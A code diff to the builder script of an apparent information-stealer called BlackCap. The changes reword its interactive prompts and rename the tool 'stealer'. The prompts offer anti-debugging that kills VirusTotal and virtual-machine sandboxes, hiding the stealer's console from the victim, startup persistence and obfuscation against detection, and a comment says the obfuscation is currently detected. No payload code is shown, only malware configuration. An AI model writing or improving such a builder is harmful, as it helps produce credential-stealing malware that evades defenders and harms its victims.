@@ -97,7 +97,7 @@ class Builder:
             self.killprocess = False
 
         self.dbugkiller = input(
-            f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Enable Anti-Debug (Recommand yes, Kill Virus-Total Machines / Virtual Machines or other)? (yes/no): "
+            f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Enable Anti-Debug (Recommend yes, Kill Virus-Total Machines / Virtual Machines or other)? (yes/no): "
         )
         if self.dbugkiller.lower() == "y" or self.dbugkiller.lower() == "yes":
             self.dbugkiller = True
@@ -201,7 +201,7 @@ class Builder:
             self.startup = "no"
 
         self.hider = input(
-            f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Hide BlackCap console for victim? (yes/no): "
+            f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Hide stealer console for victim? (yes/no): "
         )
         if self.hider.lower() == "yes" or self.hider.lower() == "y":
             self.hider = "yes"
@@ -209,7 +209,7 @@ class Builder:
             self.hider = False
 
         self.obfuscation = input(
-            f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Do you want to obfuscate the BlackCap (recommand no if yes script will be detected)? (yes/no): "
+            f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Do you want to obfuscate the stealer (recommend no because obfuscation is detected rn, i will fix it later)? (yes/no): "
         )
 
         self.compy = input(
